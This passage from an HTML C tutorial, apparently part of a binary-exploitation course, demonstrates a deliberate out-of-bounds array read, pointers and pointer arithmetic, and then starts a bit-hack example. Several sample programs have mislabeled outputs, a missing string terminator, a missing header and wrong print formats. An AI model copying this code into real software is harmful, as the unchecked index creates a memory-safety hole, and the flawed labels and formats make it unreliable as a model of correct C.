                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> Array value at position 7: %i </span><span class="tok-se">\n</span><span class="tok-s">&quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">6</span><span class="tok-p">]);</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You might be thinking that line would cause an error, because we don&#8217;t even have a
                            seventh position in our array. However, it will not! Compile again and run the code.
                            Remember to always compile. If you are used to python, you might forget that step. Do not
                            forget it! The code looks like this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>
<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">()</span>
<span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">5</span><span class="tok-p">];</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">0</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">11</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">1</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">12</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">2</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">13</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">3</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">14</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">4</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">15</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-k">for</span><span class="tok-p">(</span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">i</span><span class="tok-o">=</span><span class="tok-mi">0</span><span class="tok-p">;</span><span class="tok-n">i</span><span class="tok-o">&lt;</span><span class="tok-mi">5</span><span class="tok-p">;</span><span class="tok-n">i</span><span class="tok-o">++</span><span class="tok-p">)</span>
<span class="tok-w">    </span><span class="tok-p">{</span>
<span class="tok-w">        </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> Array value at position %i: %i </span><span class="tok-se">\n</span><span class="tok-s">&quot;</span><span class="tok-p">,</span><span class="tok-n">i</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-n">i</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-p">}</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> Array value at position 7: %i </span><span class="tok-se">\n</span><span class="tok-s">&quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">6</span><span class="tok-p">]);</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And the output, should look, somewhat, like this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span> Array value at position 0: 11
 Array value at position 1: 12
 Array value at position 2: 13
 Array value at position 3: 14
 Array value at position 4: 15
 Array value at position 7: 1695902208</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>What is going on here? We did not even have a 7th position. Our array is actually only 5
                            positions in size. This is something bad. What is happening, is that C does not actually
                            have real arrays with size as other languages do. It is merely a chunk of memory. In this
                            case, our variable 'arr' is just a pointer to the first byte of that chunk of memory. When
                            we do, for example, arr[2], we are pointing to the first byte of the chunk of memory plus 8
                            bytes, because each integer has 4 bytes, so we move in memory to point to the place in which
                            is stored the third position. You will understand this better as you advance in binary
                            exploitation and understand how variables are placed in memory. For now, just know that C
                            allocates the memory needed to place a buffer, but does not have any control that prevents
                            you accessing the wrong place. In our example, 1695902208 is value from our program that is
                            8 bytes away from the spots in which or array should be stored, it could be other variable.
                            Many people claim that C does not have real arrays, because as you saw, it is just a chunk
                            of memory.</p>
                    </div>
                    <div class="paragraph">
                        <p>In C, you can create not only variables, but also pointers to variables. A pointer simply
                            stores the address in which a variable is located in memory. Now that you can read few lines
                            of C, it is better to explain a program using the comments on C to explain the things that
                            might be new to you. So, let&#8217;s take a look at the following program that illustrates
                            pointers in an easy manner. Pay close attention to the comments. Create a file, paste that
                            code, compile it, and run it as you already know how to. The following program might seem a
                            bit long, but it is because it has several prints so you can understand what is happening.
                            Is very easy to read. This is the program:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>
<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">()</span><span class="tok-w"> </span><span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-c1">//we declare a char:</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">c</span><span class="tok-o">=</span><span class="tok-sc">&#39;S&#39;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-c1">//We declare a pointer to char, for that we use the *</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-n">p</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-c1">//Assign address of the char c, to pointer p. To get the address of a variable we use &amp;</span>
<span class="tok-w">    </span><span class="tok-n">p</span><span class="tok-o">=&amp;</span><span class="tok-n">c</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-w"> </span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the value of char c: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">c</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//As we said, we use &amp; to get the address. We are printing the memory address in which c is located:</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-w"> </span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the address of char c: %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-n">c</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-w"> </span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the address that pointer p is pointing at, which is the address of c: %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">p</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//we use * to get the content in the address we are pointing at</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-w"> </span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the content of the address that pointer p is pointing at, which is the value of c: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-n">p</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-w"> </span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the address of the pointer (a pointer has to be located somewhere as well as any variable): %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-n">p</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//</span>
<span class="tok-w">    </span><span class="tok-c1">//Now, we can use pointers to point to the first character of an array of characters, and move through it</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-n">p2</span><span class="tok-w"> </span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-c1">//We use malloc to allocate 6 bytes</span>
<span class="tok-w">    </span><span class="tok-n">p2</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-n">malloc</span><span class="tok-p">(</span><span class="tok-mi">6</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-w"> </span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the address that pointer p2 is pointing at %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">p2</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//Note: memory allocated with malloc, is allocated in the heap, so you see</span>
<span class="tok-w">    </span><span class="tok-c1">//that its value is far from the other values we have printed that were local</span>
<span class="tok-w">    </span><span class="tok-c1">//variables and are allocated in the stack. You will learn more about the stack and heap later.</span>
<span class="tok-w">    </span><span class="tok-c1">//p2 is pointing to memory in the heap, but it&#39;s a local variable, so if we print</span>
<span class="tok-w">    </span><span class="tok-c1">//its address it should be close to the other local variables:</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-w"> </span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the address of  p2: %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-n">p2</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//Now we assign values to the bytes we have allocated:</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">p2</span><span class="tok-o">+</span><span class="tok-mi">0</span><span class="tok-p">)</span><span class="tok-o">=</span><span class="tok-sc">&#39;h&#39;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">p2</span><span class="tok-o">+</span><span class="tok-mi">1</span><span class="tok-p">)</span><span class="tok-o">=</span><span class="tok-sc">&#39;e&#39;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">p2</span><span class="tok-o">+</span><span class="tok-mi">2</span><span class="tok-p">)</span><span class="tok-o">=</span><span class="tok-sc">&#39;l&#39;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">p2</span><span class="tok-o">+</span><span class="tok-mi">3</span><span class="tok-p">)</span><span class="tok-o">=</span><span class="tok-sc">&#39;l&#39;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">p2</span><span class="tok-o">+</span><span class="tok-mi">4</span><span class="tok-p">)</span><span class="tok-o">=</span><span class="tok-sc">&#39;o&#39;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">p2</span><span class="tok-o">+</span><span class="tok-mi">5</span><span class="tok-p">)</span><span class="tok-o">=</span><span class="tok-mi">0</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is p2 printed as a string: %s &quot;</span><span class="tok-p">,</span><span class="tok-n">p2</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//Note that 0 (the ASCII for NULL), is the end of the string.</span>
<span class="tok-w">    </span><span class="tok-c1">//Also note that 0 is different from &#39;0&#39;, &#39;0&#39; is actually 48, if you print it as an int</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the value of the zero char, different from null char: %d &quot;</span><span class="tok-p">,</span><span class="tok-sc">&#39;0&#39;</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//See what happens if we put a 0 in the middle of our char array:</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">p2</span><span class="tok-o">+</span><span class="tok-mi">2</span><span class="tok-p">)</span><span class="tok-o">=</span><span class="tok-mi">0</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the string we just created: %s &quot;</span><span class="tok-p">,</span><span class="tok-n">p2</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//It prints only &quot;he&quot;</span>
<span class="tok-w">    </span><span class="tok-c1">//</span>
<span class="tok-w">    </span><span class="tok-c1">//Of course a string can be created in a shorter way, for instance:</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-n">p3</span><span class="tok-o">=&amp;</span><span class="tok-s">&quot;hello&quot;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the content pointed by p3: %s &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">p3</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//</span>
<span class="tok-w">    </span><span class="tok-c1">//Now, let&#39;s make a pointer to pointer to char, we will use the pointer p that points to the char c we declare previously</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">**</span><span class="tok-n">pp</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">pp</span><span class="tok-o">=&amp;</span><span class="tok-n">p</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-c1">//So, imagine pp is a box (the first box), that contains an address that points to a second box, that contains an address that points to a third box, that contains a char</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the address in which pp is allocated, the address of the first box: %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-n">pp</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the address  pp points at, the content of the first box: %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">pp</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the content of the second box: %d &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-n">pp</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the content of the third box: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">**</span><span class="tok-n">pp</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//we can create as many pointers to pointers as we need:</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">***</span><span class="tok-n">ppp</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">ppp</span><span class="tok-o">=&amp;</span><span class="tok-n">pp</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is the content of ***ppp: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">***</span><span class="tok-n">ppp</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//</span>
<span class="tok-w">    </span><span class="tok-c1">//To explain why this could be useful, we will quote a StackOverflow post that is cool, from user pmg, https://stackoverflow.com/questions/5580761/why-use-double-pointer-or-why-use-pointers-to-pointers</span>
<span class="tok-w">    </span><span class="tok-c1">//</span>
<span class="tok-w">    </span><span class="tok-c1">//&quot;If you want to have a list of characters (a word), you can use char *word</span>
<span class="tok-w">    </span><span class="tok-c1">//If you want a list of words (a sentence), you can use char **sentence</span>
<span class="tok-w">    </span><span class="tok-c1">//If you want a list of sentences (a monologue), you can use char ***monologue</span>
<span class="tok-w">    </span><span class="tok-c1">//If you want a list of monologues (a biography), you can use char ****biography</span>
<span class="tok-w">    </span><span class="tok-c1">//If you want a list of biographies (a bio-library), you can use char *****biolibrary</span>
<span class="tok-w">    </span><span class="tok-c1">//If you want a list of bio-libraries (a ??lol), you can use char ******lol</span>
<span class="tok-w">    </span><span class="tok-c1">//yes, I know these might not be the best data structures&quot; pmg</span>
<span class="tok-w">    </span><span class="tok-c1">//</span>
<span class="tok-w">    </span><span class="tok-c1">//Let&#39;s see how we could implement a list of words</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">**</span><span class="tok-n">pp2</span><span class="tok-o">=</span><span class="tok-n">malloc</span><span class="tok-p">(</span><span class="tok-mi">100</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-c1">//pp is the first address</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-n">pp2</span><span class="tok-o">=&amp;</span><span class="tok-s">&quot;hi&quot;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">pp2</span><span class="tok-o">+</span><span class="tok-mi">1</span><span class="tok-p">)</span><span class="tok-o">=&amp;</span><span class="tok-s">&quot;carnegie&quot;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">pp2</span><span class="tok-o">+</span><span class="tok-mi">2</span><span class="tok-p">)</span><span class="tok-o">=&amp;</span><span class="tok-s">&quot;mellon&quot;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is hi: %s &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-n">pp2</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is carnegie: %s &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">pp2</span><span class="tok-o">+</span><span class="tok-mi">1</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is mellon: %s &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">pp2</span><span class="tok-o">+</span><span class="tok-mi">2</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-c1">//You might be wondering about the relation between arrays and pointers. Some people say in c, the use of [] is just syntactic sugar.</span>
<span class="tok-w">    </span><span class="tok-c1">//But there are not actual arrays on C.</span>
<span class="tok-w">    </span><span class="tok-c1">//In this expression it is created a pointer to the first element of the array. In fact, arr is pointer to the first element:</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">5</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-s">&quot;hello&quot;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-c1">//these expressions are the same:</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is arr[0]: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">0</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is *arr: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">arr</span><span class="tok-o">+</span><span class="tok-mi">0</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-c1">//as well as:</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is arr[0]: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">1</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is *(arr+0): %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">arr</span><span class="tok-o">+</span><span class="tok-mi">1</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is arr[1]: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">2</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is *(arr+1): %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">arr</span><span class="tok-o">+</span><span class="tok-mi">2</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is arr[2]: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">3</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is *(arr+2): %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">arr</span><span class="tok-o">+</span><span class="tok-mi">3</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is arr[3]: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">4</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is *(arr+3): %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-o">*</span><span class="tok-p">(</span><span class="tok-n">arr</span><span class="tok-o">+</span><span class="tok-mi">4</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-c1">//understanding that, you can see now why in C, a thing that looks very weird as the following, makes sense:</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> This is 1[arr]: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-mi">1</span><span class="tok-p">[</span><span class="tok-n">arr</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-c1">//As you see, it printed &#39;e&#39;, because that expression is just *(1+a), which is the same as *(a+1)</span>
<span class="tok-w">    </span><span class="tok-c1">//People says that proves that in C there are not actual arrays. What is our opinion? As long as you clearly</span>
<span class="tok-w">    </span><span class="tok-c1">//understand how it works in the languages you are using</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> SEE YOU!  keep on the good work! </span><span class="tok-se">\n</span><span class="tok-s"> &quot;</span><span class="tok-p">);</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>At this point you should know the commands for creating a file, compile it, and run it, but
                            just in case:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>nano pointers.c
gcc pointers.c -o pointers
 ./pointers</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that the compilation shows several warnings, because we did things, for the sake of the
                            example, that are not good practice.</p>
                    </div>
                    <div class="paragraph">
                        <p>With this introduction to C, you will be able to begin to read the source code from
                            challenges and clarify new things you see along the way on Google. Now it is approaching the
                            real fun of binary exploitation!</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_binary_exploitation">10. Binary Exploitation</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo_7" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>Get ready for binary exploitation. We use C to explain binary exploitation because it is a
                        language very prone to have vulnerabilities, however, other languages have similar
                        vulnerabilities.</p>
                </div>
                <div class="sect2">
                    <h3 id="_a_hack_example">10.1. A hack example!</h3>
                    <div class="paragraph">
                        <p>A hack is not necessarily a cyberattack. It is just a clever way to do something, in our
                            context, on a computer. For example, how would you make a program to print the smallest of
                            two numbers without using an if statement? This sounds complicated when you first hear it,
                            but look at the following bit hack! Make a small program in C copying this code:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>
<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">(</span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">argc</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-o">**</span><span class="tok-n">argv</span><span class="tok-p">)</span>
<span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">x</span><span class="tok-o">=</span><span class="tok-mi">9</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">y</span><span class="tok-o">=</span><span class="tok-mi">5</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">result</span><span class="tok-o">=</span><span class="tok-n">y</span><span class="tok-o">^</span><span class="tok-p">((</span><span class="tok-n">x</span><span class="tok-o">^</span><span class="tok-n">y</span><span class="tok-p">)</span><span class="tok-o">&amp;-</span><span class="tok-p">(</span><span class="tok-n">x</span><span class="tok-o">&lt;</span><span class="tok-n">y</span><span class="tok-p">));</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;this is the smallest number %d </span><span class="tok-se">\n</span><span class="tok-s">&quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">result</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-k">return</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-p">;</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>That was fantastic! What is happening here? Keep in mind the results of the following
                            operations:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-n">AND</span>
<span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">0</span>
<span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">0</span>
<span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-w"> </span><span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">1</span>
<span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">&amp;</span><span class="tok-w"> </span><span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">0</span></code></pre>
                        </div>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-n">XOR</span>
<span class="tok-mi">1</span><span class="tok-w"> </span><span class="tok-o">^</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">1</span>
